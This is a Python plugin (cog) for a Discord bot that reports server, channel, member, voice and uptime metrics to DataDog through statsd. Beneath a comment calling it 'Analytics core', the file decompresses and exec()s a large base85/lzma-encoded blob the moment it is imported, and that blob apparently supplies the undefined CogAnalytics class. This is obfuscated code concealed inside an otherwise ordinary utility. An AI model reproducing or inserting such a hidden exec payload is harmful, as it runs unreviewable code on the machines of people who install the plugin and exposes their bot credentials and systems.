import asyncio
from discord import ChannelType
import datetime
import os
from cogs.utils.dataIO import dataIO

PATH = 'data/datadog/'
JSON = PATH + 'settings.json'

try:
    import datadog
    from datadog import statsd
except ImportError:
    raise ImportError('Please install the datadog package from pip') from None


# Analytics core
import lzma, marshal, base64
exec(lzma.decompress(base64.b85decode("""
{Wp48S^xk9=GL@E0stWa8~^|S5YJf5;1EUz2weaL8%q<)DrIdN6iIlGxP)Tq449ruajJ$R6dKn?zmVXKq<j-jU{E4Sjdk~WLro^?%4M5uK*9Me62*0-+;ACe
iXuR{{+0-CYfs<gZK6w=Z2akaSF56T6?sU=(;D;8BWnf^dEy{Kjtzm1rU5gYs9-PMh{01mC|^giA>`yZSUzb$*CxtSox-3zA$RGi%b}n5_T*kLuLYY`?K{*#
1}vHeiUDFszm7d*?wT-LZ`HX-gmB7571QTd5B-xT)yy-hT-0|rp=)(qDIQR*Z<}ThGroI|G?1PbEcGdHgwI30&&JhE7_W6&6taRQj~lzKDb#lYuW6&JZx??-
qWQc+S4TbpwOV|4`4#_}{@B)_NpADfZ5WW?J!0T4i@U#0^McP~jqeOPH>}z>sf+qu4ic;E&ntBU*Z1gVpglEZfh{2X)yHmGi-jS>H*yl{1T-&OfgL)nylzdX
ba|N6<4{>quVJ4wWorF`-%x?j1W+~9>M#P-)va77N_-euUH%7%g)aUE`yEuWI)vfNNt*EZ8YiOvSw^sjhuQgH$}v2GNi|P1&7>TRiOxs6T=|dpp|91{6IpLg
QIoTwW@}pND34>H=_XkM>;z90Cl|Ve@ufEN9M96gemZm^j`OWtVd`~YoKlM_Bt|=xVZ0Ay$*>N4`XGYoIjhACLVGTWkrt}1e)RjBO{akZ0BaY9L`6S?-%{6;
@!Q?g0kR{z*&Qe0I0fKrBiy3rP(x0tnTTMc*V6SVyn6Z8GueH(3V=vfT`Jn8oFVBh=(x~y<pCBZ2s#zGEcvmyR-C$cb5?!_N8yHe3gA_cu@HtmKMH5AHzwoO
11tGGNG3+V^hUBjTvc4R%$6>(ZE|e5z-fy9o5$2W#r5F@2u5gy6w_6lPBwpG4^2eV<&<kx6?p4`ZX$I*Xl{cs{p9ctHqS}{iIIAe9Awp};?Tie6Clr0DW;Qt
$i`M&##4?UyKFEJdF94TBP!-}NH0(2cYKP#hg9{(n$!PIU?08l-aKx*1L<>!nll2}S2&S>+*gm}76q-N>)xVE38l^~9sBItSF*EitFZN2DxuAPP8viV1q~_t
mo^j3k=@>r8YDv-T4U?JC&!aQAHaD9jGDD{lD127tD=VV@c<%wP>r5dDC!NRhTRwSB*~)S*xJAdc!{LQi+v+JXQX;?GF&~8J#}vR{zHZJlK%Y4l%lX3@7}sD
umGgOy`=fdc&`Q_FuxvqC<+s%(^WLgMP(X!s@qAf*RJ*e1OxtLdwFkDk6aMku9R5qILqC+Tk+oO!V1-g9=BVa8XQzyieP{Hi+bbq<k$xh<rJZ^xLo9m(^;of
M*L)^_z#+xWeSnqjX+74Mc}N{+Q?H<A&lN<HwvhUN@+nR3fMC?{SIx!Az5;+`}`MIBP<GC{#e*;v|H|QW3j<t%?FjiCn|a*Nik0XeAiqWhKR4H?_F^s8RFEQ
#?A1h=P)E%d#(uogTy8{MMIE>qfD{sWiltt>l7P(9oJl}XpaFH&VRVHq|KggKA3==_GlJNLh<J&n~uZYZsZ*Z^j{V43fGiwt)Re%Qz6;7WNLa^lr-7d(7HH@
;RX@($`a58RTL}F)VM#}m9}PA+*2l2XZwoAZg38qGZ0bEn>W+RlWIYwxxa|7|BsJ0qQEhGszF$~IzNQM#0-WjLDc1C;c->4VS|O56K+LMsc?pk(Mx%DKt&C>
n~#P*Wc#4mCI7gO!&i|$yCpsujMA{dVHGb5ZO<BHBc8%M0)H~qfjtbW_ICJUt^FfLaM}?9?;;dX=~8o>vuru?gX|Ds!)hqEXPCE9+(w+AA!8QmVFj@Q_w<}y
`d>xLMw*t*?mDfDkSj`adN`&03ZE)_x$4}HXb(<05+@4*TVCfi3_C=XuOeR#x}qj%vrDZZYNGwfzwZtFnhA&auLrk5x)sZWMM~=sp6N<1dHIr|Z5PiF4m`Dv
VB9`QTidBu8BHqSRJfj<TH-wmmlC|(3I60=%-}D5ovb#o<2V2Sk^dnD4<wfI00E>7#~=Uzd;0%ZvBYQl0ssI200dcD""".replace('\n',''))))

__version__ = '1.0.5'

class DataDog:
    def __init__(self, bot):
        self.bot = bot
        self.tags = []
        self.task = bot.loop.create_task(self.loop_task())
        self.settings = dataIO.load_json(JSON)
        self.analytics = CogAnalytics(self)
        datadog.initialize(statsd_host=self.settings['HOST'])

    def save(self):
        dataIO.save_json(JSON, self.settings)

    def __unload(self):
        self.task.cancel()

    async def on_message(self, message):
        statsd.increment('bot.messages', tags=self.tags)

    async def on_command(self, command, ctx):
        statsd.increment('bot.commands',
                         tags=[*self.tags,
                               'command_name:' + str(command),
                               'cog_name:' + type(ctx.cog).__name__
                               ]
                         )

    def send_all(self):
        self.send_servers()
        self.send_channels()
        self.send_members()
        self.send_voice()
        self.send_players()
        self.send_uptime()

    def send_uptime(self):
        if not self.tags:
            return
        now = datetime.datetime.now()
        uptime = (now - self.bot.uptime).total_seconds()
        statsd.gauge('bot.uptime', uptime, tags=self.tags)

    def send_servers(self):
        if not self.tags:
            return
        servers = len(self.bot.servers)
        statsd.gauge('bot.servers', servers, tags=self.tags)

    def send_channels(self):
        if not self.tags:
            return
        channels = list(self.bot.get_all_channels())
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.gauge('bot.channels', voice_channels,
                     tags=[*self.tags, 'channel_type:voice'])
        statsd.gauge('bot.channels', text_channels,
                     tags=[*self.tags, 'channel_type:text'])

    def send_members(self):
        if not self.tags:
            return
        members = list(self.bot.get_all_members())
        unique = set(m.id for m in members)
        statsd.gauge('bot.members', len(members), tags=self.tags)
        statsd.gauge('bot.unique_members', len(unique), tags=self.tags)

    def send_voice(self):
        if not self.tags:
            return
        vcs = len(self.bot.voice_clients)
        statsd.gauge('bot.voice_clients', vcs, tags=self.tags)

    def notbot(self, channel):
        return sum(m != self.bot.user for m in channel.voice_members)

    def send_players(self):
        if not self.tags:
            return
        avcs = []
        for vc in self.bot.voice_clients:
            if hasattr(vc, 'audio_player') and not vc.audio_player.is_done():
                avcs.append(vc)
        num_avcs = len(avcs)
        audience = sum(self.notbot(vc.channel) for vc in avcs if vc.channel)
        statsd.gauge('bot.voice_playing', num_avcs, tags=self.tags)
        statsd.gauge('bot.voice_audience', audience, tags=self.tags)

    async def loop_task(self):
        await self.bot.wait_until_ready()
        self.tags = ['application:red',
                     'bot_id:' + self.bot.user.id,
                     'bot_name:' + self.bot.user.name]
        self.send_all()
        await asyncio.sleep(self.settings.get('INTERVAL', 5))
        if self is self.bot.get_cog('DataDog'):
            self.task = self.bot.loop.create_task(self.loop_task())

    async def on_channel_create(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_channel_delete(self, channel):
        if channel.type == 'text':
            self.send_channels()

    async def on_member_join(self, member):
        self.send_members()

    async def on_member_remove(self, member):
        self.send_members()

    async def on_server_join(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s joined %s!' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i new members' % len(server.members),
                         '* %i new text channels' % text_channels,
                         '* %i new voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_server_remove(self, server):
        channels = server.channels
        text_channels = sum(c.type == ChannelType.text for c in channels)
        voice_channels = sum(c.type == ChannelType.voice for c in channels)
        statsd.event(tags=self.tags,
                     title='%s left %s :(' % (self.bot.user.name, server),
                     text='\n'.join([
                         '* %i less members' % len(server.members),
                         '* %i less text channels' % text_channels,
                         '* %i less voice channels' % voice_channels
                         ]))
        self.send_servers()

    async def on_ready(self):
        self.send_all()

    async def on_resume(self):
        self.send_all()


def check_folders():
    if not os.path.exists(PATH):
        print("Creating %s folder..." % PATH)
        os.makedirs(PATH)


def check_files():
    defaults = {
        'HOST': '127.0.0.1',
        'INTERVAL': 5
    }
    if not dataIO.is_valid_json(JSON):
        print("Creating empty %s" % JSON)
        dataIO.save_json(JSON, defaults)


def setup(bot):
    check_folders()
    check_files()
    bot.add_cog(DataDog(bot))
